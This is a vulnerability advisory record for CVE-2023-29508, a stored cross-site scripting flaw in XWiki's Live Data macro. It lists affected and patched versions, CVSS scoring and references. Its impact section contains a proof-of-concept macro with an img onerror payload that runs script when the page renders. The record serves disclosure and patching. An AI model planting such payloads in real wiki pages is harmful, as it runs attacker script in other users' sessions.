advisory_id: GHSA-hmm7-6ph9-8jf2
datasource_id: github_osv_importer_v2/GHSA-hmm7-6ph9-8jf2
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/04/GHSA-hmm7-6ph9-8jf2/GHSA-hmm7-6ph9-8jf2.json
aliases:
  - CVE-2023-29508
summary: |
  org.xwiki.platform:xwiki-platform-livedata-macro vulnerable to Basic Cross-site Scripting
  ### Impact
  A user without script rights can introduce a stored XSS by using the Live Data macro, if the last author of the content of the page has script rights.

  For instance, by adding the LiveData below in the about section of the profile of a user created by an admin.

  ```javascript
  {{liveData id="movies" properties="title,description"}}
  {
    "data": {
      "count": 1,
      "entries": [
        {
          "title": "Meet John Doe",
          "url": "https://www.imdb.com/title/tt0033891/",
          "description": "<img onerror='alert(1)' src='foo' />"
        }
      ]
    },
    "meta": {
      "propertyDescriptors": [
        {
          "id": "title",
          "name": "Title",
          "visible": true,
          "displayer": {"id": "link", "propertyHref": "url"}
        },
        {
          "id": "description",
          "name": "Description",
          "visible": true,
          "displayer": "html"
        }
      ]
    }
  }
  {{/liveData}}
  ```

  ### Patches
  This has been patched in XWiki 14.10, 14.4.7, and 13.10.11.

  ### Workarounds
  No known workaround.

  ### References
  - https://jira.xwiki.org/browse/XWIKI-20312

  ### For more information
  If you have any questions or comments about this advisory:

  * Open an issue in [Jira](http://jira.xwiki.org/)
  * Email us at [Security ML](mailto:security@xwiki.org)
impacted_packages:
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-livedata-macro
    affected_versions: vers:maven/>=13.10.10|<13.10.11
    fixed_versions: vers:maven/13.10.11
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-livedata-macro
    affected_versions: vers:maven/>=14.4|<14.4.7
    fixed_versions: vers:maven/14.4.7
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:maven/org.xwiki.platform/xwiki-platform-livedata-macro
    affected_versions: vers:maven/>=14.9|<14.10
    fixed_versions: vers:maven/14.10
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.9'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/04/GHSA-hmm7-6ph9-8jf2/GHSA-hmm7-6ph9-8jf2.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-80
  - CWE-79
references:
  - url: https://github.com/xwiki/xwiki-platform
    reference_type:
    reference_id:
  - url: https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-hmm7-6ph9-8jf2
    reference_type:
    reference_id:
  - url: https://jira.xwiki.org/browse/XWIKI-20312
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-29508
    reference_type:
    reference_id: CVE-2023-29508
